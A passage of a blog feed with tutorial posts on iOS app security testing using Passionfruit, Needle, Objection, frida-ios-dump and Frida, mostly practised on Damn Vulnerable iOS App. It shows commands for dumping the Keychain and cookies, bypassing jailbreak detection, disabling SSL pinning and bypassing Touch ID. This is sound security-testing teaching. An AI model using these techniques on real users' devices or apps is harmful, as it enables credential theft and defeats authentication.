  &lt;li&gt;Check signature entitlements.&lt;/li&gt;
  &lt;li&gt;List human readable app meta info (Info.plist).&lt;/li&gt;
  &lt;li&gt;Capture screenshot.&lt;/li&gt;
  &lt;li&gt;Checksec: see if target app is encrypted, and has enabled PIE, ARC and stack canary.&lt;/li&gt;
  &lt;li&gt;App sandbox file browser. Directly preview images, SQLite databases and plist files on device. You can always download the file for further investigation.&lt;/li&gt;
  &lt;li&gt;Check the loaded frameworks. Hook exported native functions from these dylib to print the arguments and stack trace.&lt;/li&gt;
  &lt;li&gt;Log SQLite operations.&lt;/li&gt;
  &lt;li&gt;Log and try to bypass jailbreak detection.&lt;/li&gt;
  &lt;li&gt;List Objective-C classes from app, hook the methods and inspect the arguments and stack trace.&lt;/li&gt;
  &lt;li&gt;Dump KeyChain, BinaryCookies and UserDefaults.&lt;/li&gt;
&lt;/ul&gt;

&lt;!--more--&gt;

&lt;p&gt;To install Passionfruit, simple run the command &lt;em&gt;npm install -g passionfruit&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once installed, just run the command &lt;em&gt;passionfruit&lt;/em&gt; to run it. It will start a server on localhost. &lt;img src=&quot;/images/posts/ios55/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Head over to the address mentioned. Please note that you need to have a jailbroken device connected over USB which has Frida installed on it. However, if there is no jailbroken device connected, then the app to be inspected needs to have the FridaGadget.dylib file injected into it. This has been explained in a lot of detail in the previous articles in the same series. You will be greeted with a UI like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Clicking on any app will just spawn the app on the device. And you will see a lot of useful information about the app, which includes the Bundle and the Data Directory, the entitlements used by the app, the URL schemes and the contents of the Info.plist file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is extremely useful information. On the top you can also see some options about the binary (PIE, ENC, ARC, Stack Canary etc). Ideally you will be scrambling for this infomration from the command line. You can also just browse the contents of the device filesystem using this web GUI. For e.g, let’s click on the Data directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s head onto the Documents directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can view plist or sqlite files using the inbuilt viewers that come with passionfruit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Modules tab will show you all the loaded modules with this application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And the Classes tab will show you all the loaded classes into this application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Clicking on any class will show you the corresponding methods for that class. If you click on any of these methods, it will create a hook for it. If this method gets called, you will see it in the Console Tab. You can manage these hooks using the &lt;em&gt;Manage Hooks&lt;/em&gt; tab on the top right.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/11.png&quot; alt=&quot;11&quot; /&gt; &lt;img src=&quot;/images/posts/ios55/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The code runner tab will allow you to run Frida scripts in javascript.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Storage section will show you all the data stored via Keychain, UserDefaults or Cookies APIs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios55/12.png&quot; alt=&quot;12&quot; /&gt; &lt;img src=&quot;/images/posts/ios55/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This was an intro to using Passionfruit. As it can be seen, this tool can be extremely useful in assessing the security of iOS apps because of its nice UI that gives a plethora of info about the application which would normally require some decent effort to gather.&lt;/p&gt;

&lt;p&gt;The following tests were performed on a jailbroken iPhone6 device running iOS 10.0.1.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;https://github.com/chaitin/passionfruit&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 54 - The Needle Framework</title>
   <link href="https://bitbrain.github.io/2018/07/30/ios-application-security-part-54-the-needle-framework.html"/>
   <updated>2018-07-30T11:47:00+00:00</updated>
   <id>https://bitbrain.github.io/2018/07/30/ios-application-security-part-54-the-needle-framework</id>
   <content type="html">&lt;p&gt;In this article, we will talk about another framework for assessing iOS apps named &lt;a href=&quot;https://github.com/mwrlabs/needle/&quot;&gt;Needle.&lt;/a&gt; Released by MWR labs and written by Marco Lancini, it provides a lot of modules that with help automate a lot of the tasks while doing iOS security assessments. Needle requires a jailbroken device and uses an agent installed on the jailbroken device that communicates with the host installed on the computer. At the time of writing of this article, Needle supports devices until iOS 10 only.
&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;To install Needle, add the source http://mobiletools.mwrinfosecurity.com/cydia/ in Cydia and then search for NeedleAgent and install it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/1.PNG&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Open the NeedleAgent app and make sure it is listening.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/2.PNG&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On your computer, clone the latest version of Needle and install all the dependencies . A detailed installation guide can be found &lt;a href=&quot;https://github.com/mwrlabs/needle/wiki/Installation-Guide&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/3c.png&quot; alt=&quot;3c&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Make sure the needle agent is running in foreground on the device. Run the &lt;em&gt;show options&lt;/em&gt; command to see all the list of global options.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/4c.png&quot; alt=&quot;4c&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Make sure to set the correct PASSWORD option to let Needle connect to the device. Once you have configured these settings, run the &lt;em&gt;shell&lt;/em&gt; command to get a shell on your device. Another important global option that you can set is the OUTPUT_FOLDER option. You can then use the &lt;em&gt;exit&lt;/em&gt; command to exit out of the shell and back into the needle interpreter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/5c.png&quot; alt=&quot;5c&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Running the command &lt;em&gt;show modules&lt;/em&gt; will list all the modules that Needle supports.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/6c.png&quot; alt=&quot;6c&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can use any module with the &lt;em&gt;use modulename&lt;/em&gt; command, and the &lt;em&gt;run&lt;/em&gt; command will execute the module for you. If you want to analyze any specific app, you can see the app bundle id as a global parameter. If this is not set, needle will display a prompt to let you choose whichever app id you want.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/7c.png&quot; alt=&quot;7c&quot; /&gt; &lt;img src=&quot;/images/posts/ios54/8c.png&quot; alt=&quot;8c&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following module will tell you the URL schemes the app registers to by copying the info.plist file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/9c.png&quot; alt=&quot;9c&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And this one will give the MDM user settings for the device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/10c.png&quot; alt=&quot;10c&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Running the &lt;em&gt;info&lt;/em&gt; command after selecting a module will give you the details about that particular module.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/11c.png&quot; alt=&quot;11c&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Needle also has many different modules for working with Frida.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/12c.png&quot; alt=&quot;12c&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And in some cases the modules might also have certain options that need to be configured.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios54/13c.png&quot; alt=&quot;13c&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the full list of modules. It is important to note that not all of these features work for iOS 10, and thus at the time of writing this article, needle doesn’t support iOS 10 completely.&lt;/p&gt;

&lt;pre&gt;	[needle] &amp;gt; show modules

	  _Templates
	  ----------
	    _templates/template_background
	    _templates/template_base
	    _templates/template_frida
	    _templates/template_frida_script
	    _templates/template_static

	  Binary
	  ------
	    binary/info/checksums
	    binary/info/compilation_checks
	    binary/info/metadata
	    binary/info/provisioning_profile
	    binary/info/universal_links
	    binary/installation/install
	    binary/installation/pull_ipa
	    binary/reversing/class_dump
	    binary/reversing/class_dump_frida_enum-all-methods
	    binary/reversing/class_dump_frida_enum-classes
	    binary/reversing/class_dump_frida_find-class-enum-methods
	    binary/reversing/shared_libraries
	    binary/reversing/strings

	  Comms
	  -----
	    comms/certs/delete_ca
	    comms/certs/export_ca
	    comms/certs/import_ca
	    comms/certs/install_ca_burp
	    comms/certs/install_ca_mitm
	    comms/certs/list_ca
	    comms/certs/view_cert
	    comms/proxy/pinning_bypass_frida
	    comms/proxy/proxy_regular

	  Device
	  ------
	    device/agent_client
	    device/clean_storage
	    device/dependency_installer
	    device/hosts
	    device/list_apps

	  Dynamic
	  -------
	    dynamic/detection/jailbreak_detection
	    dynamic/detection/script_jailbreak-detection-bypass
	    dynamic/ipc/open_uri
	    dynamic/memory/heap_dump
	    dynamic/monitor/files
	    dynamic/monitor/pasteboard
	    dynamic/monitor/syslog
	    dynamic/watch/syslog

	  Hooking
	  -------
	    hooking/cycript/cycript_shell
	    hooking/cycript/cycript_touchid
	    hooking/frida/frida_launcher
	    hooking/frida/frida_shell
	    hooking/frida/frida_trace
	    hooking/frida/script_anti-hooking-check
	    hooking/frida/script_dump-ui
	    hooking/frida/script_hook-all-methods-of-class
	    hooking/frida/script_hook-method-of-class
	    hooking/frida/script_touch-id-bypass
	    hooking/theos/list_tweaks
	    hooking/theos/theos_tweak

	  Mdm
	  ---
	    mdm/effective_user_settings

	  Static
	  ------
	    static/code_checks

	  Storage
	  -------
	    storage/backup/icloud_content_frida
	    storage/caching/keyboard_autocomplete
	    storage/caching/screenshot
	    storage/data/container
	    storage/data/files_binarycookies
	    storage/data/files_cachedb
	    storage/data/files_plist
	    storage/data/files_sql
	    storage/data/keychain_dump
	    storage/data/keychain_dump_frida

	[needle] &amp;gt;
&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;https://github.com/mwrlabs/needle/&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 53 - Objection continued</title>
   <link href="https://bitbrain.github.io/2018/07/29/ios-application-security-part-53-objection-continued.html"/>
   <updated>2018-07-29T17:48:00+00:00</updated>
   <id>https://bitbrain.github.io/2018/07/29/ios-application-security-part-53-objection-continued</id>
   <content type="html">&lt;p&gt;In this article, we will continue looking into Objection and some of the use cases it provides.&lt;/p&gt;

&lt;p&gt;One of the most useful features objection provides is the ability to bypass jailbreak detection. This might not be always effective since it’s only looking for certain checks that an application will do to detect a jailbroken device and hooks them to return a false value. But any application can deploy a check not looked into by objection and the jailbreak detection bypass will fail. Neverthless, this feature might be useful in many cases where the apps are doing basic checks only.&lt;/p&gt;

&lt;!--more--&gt;
&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/1a.png&quot; alt=&quot;1a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is also important to note that an application can just use some native C code to detect all the injected dylibs into the application and simply exit the app without any warning if it finds a dylib with the name FridaGadget. This has been observed in some apps that i have tested. A simple bypass would be to just change the name of the Frida dylib file to something else.&lt;/p&gt;

&lt;p&gt;You can also simulate a jailbroken environment to understand how an application behaves in a jailbroken environment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/2a.png&quot; alt=&quot;2a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Objection uses jobs to list all the tasks that it is performing in the background. You can use the command &lt;em&gt;jobs list&lt;/em&gt; to list the tasks and &lt;em&gt;jobs kill UDID&lt;/em&gt; to kill them.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/ 3a.png&quot; alt=&quot;3a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The hooking module is one of the most useful modules as it allows you to list the classes, methods, trace all the function calls and even dump the args or modify the return value.&lt;/p&gt;

&lt;p&gt;Use the command &lt;em&gt;ios hooking list classes&lt;/em&gt; to list all the classes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/4a.png&quot; alt=&quot;4a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use the command &lt;em&gt;ios hooking list class_methods classname&lt;/em&gt; to list all the methods for a particular class.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/5a.png&quot; alt=&quot;5a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use the command &lt;em&gt;ios hooking watch classname&lt;/em&gt; to trace all the methods for a particular class.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/6a.png&quot; alt=&quot;6a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can now look for certain methods and dump the arguments (–dump-args) and return value (–dump-return). And the –dump-backtrace command will give you a list of the previous methods being called.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/12a.png&quot; alt=&quot;12a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s try and solve the Jailbreak Detection challenge in Damn Vulnerable iOS App.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/8a.png&quot; alt=&quot;8a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And you can also set return values of methods. In this case, it is used to bypass Jailbreak Detection in Damn Vulnerable iOS App.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/7a.png&quot; alt=&quot;7a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also enable Touch ID Bypass which as discussed in previous articles can be bypassed by hooking into the method -[LAContext evaluatePolicy:localizedReason:reply:]. This hooking technique will only work in some cases as discussed in a previous article on Touch ID bypass in this series. On devices with FaceID do some incorrect attmepts and then click on Enter passcode which will trigger the bypass.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/11a.png&quot; alt=&quot;11a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use the command &lt;em&gt;ios pasteboard monitor&lt;/em&gt; to monitor the contents of the Pasteboard.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/9a.png&quot; alt=&quot;9a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use the command &lt;em&gt;ios sslpinning disable&lt;/em&gt; to disable sslpinning. Ofcourse this method is not foolproof and tries to hook into some low level methods that are called while doing SSL pinning validation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/10a.png&quot; alt=&quot;10a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And finally, you can use the &lt;em&gt;ios ui&lt;/em&gt; module to take a screenshot or just dump the view hierarchy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios53/13a.png&quot; alt=&quot;13a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this article, we had a good look at some of the advanced functionalities that objection provides. In the next article, we will look at another essential framework named Needle to help with iOS security assessments.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;https://github.com/sensepost/objection&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 52 - Inspecting iOS apps with Objection</title>
   <link href="https://bitbrain.github.io/2018/07/28/ios-application-security-part-52-inspecting-ios-apps-with-objection.html"/>
   <updated>2018-07-28T10:48:00+00:00</updated>
   <id>https://bitbrain.github.io/2018/07/28/ios-application-security-part-52-inspecting-ios-apps-with-objection</id>
   <content type="html">&lt;p&gt;In the previous few articles, we have looked at how we can use Frida to perform dynamic instrumentation of applications. In this article, we will look at a tool based using Frida’s capabilities, known as &lt;a hred=&quot;https://github.com/sensepost/objection&quot;&gt;objection&lt;/a&gt;, which can be very useful in testing iOS applications on non-jailbroken devices. The only thing that is required is an unencrypted IPA (insert Frida Gadget using &lt;a href=&quot;https://github.com/Tyilo/insert_dylib&quot;&gt;insert_dylb&lt;/a&gt;) or the source code. Since in the previous article we already looked at how we can add a Frida dylib into the source code and do instrumentation, we will carry forward from there in this article. We will be using &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS App&lt;/a&gt; for this article.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;Here are the various features of Objection as mentioned on their Github &lt;a href=&quot;https://github.com/sensepost/objection&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first thing is to install Objection on the computer which can be installed very easily with &lt;em&gt;pip3 install objection&lt;/em&gt;. In some cases, you might be better off setting up a virtual environemnt for python3. It is recommended to go through the installation instructions mentioned on their Github page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once done, run the command &lt;em&gt;objection&lt;/em&gt; to see if it was successfully installed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Make sure you have an application that has FridaGadget.dylib injected into it. Start the application on the device and it will pause as its waiting for a frida client to attach to it. Now from your computer, run the &lt;em&gt;objecion device_type&lt;/em&gt; command to do a quick test.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now run the command &lt;em&gt;objection explore -q&lt;/em&gt; to attach to the application. Keep in mind that this is not early instrumentation since you are attaching to the application after is is being launched. For early instrumentation you can just use Frida with the spawn command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can just press TAB on your computer to see all the list of available commands. One of the most useful features of objection is the autocompletion feature so we don’t have to remember all these commands.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For any extra tasks not performed by objection, you can just load the corresponding fridascript with the import command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, now we can use objection to do various tasks. It is important to note that whatever is happening here is happening within the context of the application with all the sandbox restrictions still being employed in place. Also, all the ios specific commands start with &lt;em&gt;ios&lt;/em&gt;. Also, any command you want to run on your computer from within the objection interpreter must have ! prepended to it.&lt;/p&gt;

&lt;p&gt;Use &lt;em&gt;pwd print&lt;/em&gt; to print out the current working directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A simple &lt;em&gt;ls&lt;/em&gt; command will dump the contents from the current working directory within the application context.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s run &lt;em&gt;env&lt;/em&gt; and this will give us all the folders related to the application. We are mostly interested in the application data here which is mostly present in the Documents folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s head over to the Documents directory and run the ls command there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The data stored in the info.plist file can be dumped with &lt;em&gt;ios plist cat filename&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Optionally, another way of achieving the same would be to download the file to your computer with the &lt;em&gt;file download filename&lt;/em&gt; command and then use the OS command cat (prepended with an !) to list the contents of the file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see all the data stored using the NSUserDefaults or UserDefaults (in new SDKs) using the &lt;em&gt;ios nsuserdefaults get&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And you can use the &lt;em&gt;ios keychain dump&lt;/em&gt; to dump the keychain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios52/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the next article, we will continue looking at some of the other useful functionalities of Objection.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;https://github.com/sensepost/objection&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 51 - Dumping decrypted IPA and Dynamic Instrumentation on a non-jailbroken device</title>
   <link href="https://bitbrain.github.io/2018/07/27/ios-application-security-part-51-dumping-decrypted-ipa-and-dynamic-instrumentation-on-a-non-jailbroken-device.html"/>
   <updated>2018-07-27T19:48:00+00:00</updated>
   <id>https://bitbrain.github.io/2018/07/27/ios-application-security-part-51-dumping-decrypted-ipa-and-dynamic-instrumentation-on-a-non-jailbroken-device</id>
   <content type="html">&lt;p&gt;In this article, we will look at how to dump decrypted IPA file for an application using frida and then look at how to set up Frida for dynamic instrumentation on a non-jailbroken device.&lt;/p&gt;

&lt;p&gt;To dump an IPA, we will use an open source tool known as frida-ios-dump which can be found on https://github.com/AloneMonkey/frida-ios-dump.&lt;/p&gt;

&lt;p&gt;The first thing is to set up port forwarding. This can be done by using iproxy. By default frida-ios-dump will connect from local port 2222 to remote port 22. So this is what we will set up with iproxy as well.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, clone the repo from github.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now navigate under the tool directory, open the file dump.py and and change the user/pass to that of your device. This will allow frida-ios-dump to connect to your device over the tunnel you just created. All of this is assuming your device is connected to the computer over USB. If its over Wifi (SSH), then the public key for the device must be added to the target device’s ~/.ssh/authorized_keys file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now you can use the command &lt;em&gt;python dump.py AppName&lt;/em&gt; to dump the IPA file from the device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next thing we need to learn is to do dynamic instrumentation on a non jailbroken device. This requires us to have the source code of the application or a decrypted IPA. In this article, we will only discuss the scenario where source code is required. The way it works is that we include a dylib in the application source code. This dylib needs to be obviously signed before being deployed into the device. Since the device is not jailbroken in this case, you need to sign it with your official Apple developer certificate (and not a self signed certificate). In this case, we will be inserting the dylib into Damn Vulnerable iOS application. You can clone DVIA from &lt;a href=&quot;https://github.com/prateek147/DVIA-v2.git&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You can grab the latest release of the Frida gadget from the Frida releases page. Look for the iOS gadget. At the time of writing this article, the latest Frida version is 12.0.4 and could be downloaded from &lt;a href=&quot;https://github.com/frida/frida/releases/download/12.0.4/frida-gadget-12.0.4-ios-universal.dylib.xz&quot;&gt;here&lt;/a&gt;. Once it is downloaded, run the following commands.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Rename this dylib file to FridaGadget.dylib. Create a directory named Frameworks and put this dylib inside there. Now open the Xcode project for the application for which you want to perform the instrumentation. Drag and drop the folder on the very top level of the directory structure (similar to App Delegate) and make sure the following options are selected.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/6.png&quot; alt=&quot;6&quot; /&gt; &lt;img src=&quot;/images/posts/ios51/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Under Project navigator, go to the &lt;em&gt;Build Phases&lt;/em&gt; section and under the &lt;em&gt;Link Binary with Libraries&lt;/em&gt;, drag and drop the FridaGadget.dylib file from the Frameworks folder. Also, make sure the &lt;em&gt;Copy Bundle Resources&lt;/em&gt; section contains the Frameworks folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In my case, i also had to disable the setting ENABLE Bitcode by going to Build Settings and disabling it. Since we are running the app locally this shoudn’t really matter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we are all set, run the app and you should a log like this in the console.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Running the command &lt;em&gt;frida -Uai&lt;/em&gt; will now show this app in the output. You can now trace the application via the normal frida commands.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since we attached to the application in the image above, the application finished launching. This can be done for late instrumentation. In order to attach to the application during launch for early instrumentation, you need to spawn it. This can be done with the -f option in frida which is used for spawning.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/12.png&quot; alt=&quot;12&quot; /&gt; &lt;img src=&quot;/images/posts/ios51/13.png&quot; alt=&quot;13&quot; /&gt; &lt;img src=&quot;/images/posts/ios51/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One last thing, you can also attach to the application in the iOS simulator by using the -R command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios51/15.png&quot; alt=&quot;15&quot; /&gt; &lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;https://frida.re/docs/ios/#without-jailbreak&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 50 - Touch ID Bypass with Frida</title>
   <link href="https://bitbrain.github.io/2018/07/26/ios-application-security-part-50-touch-id-bypass-with-frida.html"/>
   <updated>2018-07-26T07:48:00+00:00</updated>
   <id>https://bitbrain.github.io/2018/07/26/ios-application-security-part-50-touch-id-bypass-with-frida</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at Runtime Manipulation with Frida. In this article, we will look at how we can bypass Touch ID authentication in certain iOS applications using Frida. We will be performing the tests on the swift version of Damn Vulnerable iOS app which can be downloaded from damnvulnerableiosapp.com.&lt;/p&gt;

&lt;p&gt;Open the app and navigate under the section Touch/Face ID Bypass&lt;/p&gt;

&lt;p&gt;Authentication can be done in multiple ways, and can use different languages (Objective-C or Swift). One of the ways is to use the LAContext class using the Local Authentication framework. The evaluatePolicy:localizedReason:reply: method from the LAContext class presents a dialog to the user which can ask for the user to confirm the action with biometric authentication through their fingerprint. If the method returns success, the relevant action is performed. However, the action that is performed after authentication is in no way correlated with how the authentication was done. There is no way for the iOS app to determine whether the authentication was performed with a valid fingerprint, or whether the method was hooked. The following code snippet from DVIA-v2 shows the implementation (from the file TouchIDAuthentication.m) using the LAContext class.&lt;/p&gt;

&lt;!--more--&gt;

&lt;pre&gt;	+(void)authenticateWithTouchID {

	    LAContext *myContext = [[LAContext alloc] init];
	    NSError *authError = nil;
	    NSString *myLocalizedReasonString = @&quot;Please authenticate yourself&quot;;

